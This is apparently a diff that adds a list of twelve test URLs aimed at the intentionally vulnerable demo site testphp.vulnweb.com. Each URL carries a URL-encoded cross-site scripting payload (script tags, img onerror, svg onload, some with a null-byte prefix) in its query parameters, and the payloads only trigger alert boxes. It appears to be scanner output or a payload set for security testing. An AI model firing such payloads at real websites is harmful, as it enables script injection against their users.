@@ -1,0 +1,12 @@
+http://testphp.vulnweb.com/hpp/params.php?p=%2500%22%3E%3Cimg+src%3Dx+onerror%3Dalert%601%60%2F%2F&pp=12
+http://testphp.vulnweb.com/hpp/params.php?p=%2500%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&pp=12
+http://testphp.vulnweb.com/hpp/params.php?p=%2500%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pp=12
+http://testphp.vulnweb.com/hpp/params.php?p=%27%22%3E%3Csvg%2Fonload%3Dalert%28%29%3E&pp=12
+http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%2500%22%3E%3Cimg+src%3Dx+onerror%3Dalert%601%60%2F%2F
+http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%2500%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
+http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%2500%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%27%22%3E%3Csvg%2Fonload%3Dalert%28%29%3E
+http://testphp.vulnweb.com/hpp/?pp=%2500%22%3E%3Cimg+src%3Dx+onerror%3Dalert%601%60%2F%2F
+http://testphp.vulnweb.com/hpp/?pp=%2500%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
+http://testphp.vulnweb.com/hpp/?pp=%2500%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/hpp/?pp=%27%22%3E%3Csvg%2Fonload%3Dalert%28%29%3E
